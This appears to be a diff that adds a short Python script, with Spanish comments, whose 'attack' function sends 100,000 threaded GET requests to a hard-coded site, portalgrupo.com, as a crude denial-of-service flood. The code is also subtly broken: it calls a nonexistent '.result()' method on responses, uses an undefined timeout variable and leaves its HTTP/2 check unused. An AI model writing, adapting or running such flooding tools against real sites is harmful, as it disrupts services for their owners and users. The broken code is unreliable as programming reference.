@@ -1,0 +1,49 @@
+import requests
+import threading
+import random
+import time
+from bs4 import BeautifulSoup
+
+def is_http2(url):
+    response = requests.get(url)
+
+    try:
+        upgrade = response.headers['Upgrade']
+    except KeyError:
+        print(f"El servidor {url} no es compatible con HTTP/2")
+        return False
+
+    return upgrade == 'h2c'
+
+def attack(target_url, number_of_requests, connection_timeout=2):
+    threads = []
+    for i in range(number_of_requests):
+        thread = threading.Thread(target=do_attack, args=(target_url,))
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+def do_attack(target_url):
+    response = requests.get(target_url, stream=True)
+
+    # Maneja los errores de tiempo de espera
+    try:
+        response = response.result(timeout=connection_timeout)
+    except TimeoutError:
+        return
+
+    # Cierra la conexión
+    response.close()
+
+def main():
+    target_url = "https://www.portalgrupo.com"
+    number_of_requests = 100000
+
+    try:
+        attack(target_url, number_of_requests)
+    except ValueError as e:
+        print(e)
+if __name__ == "__main__":
+    main()
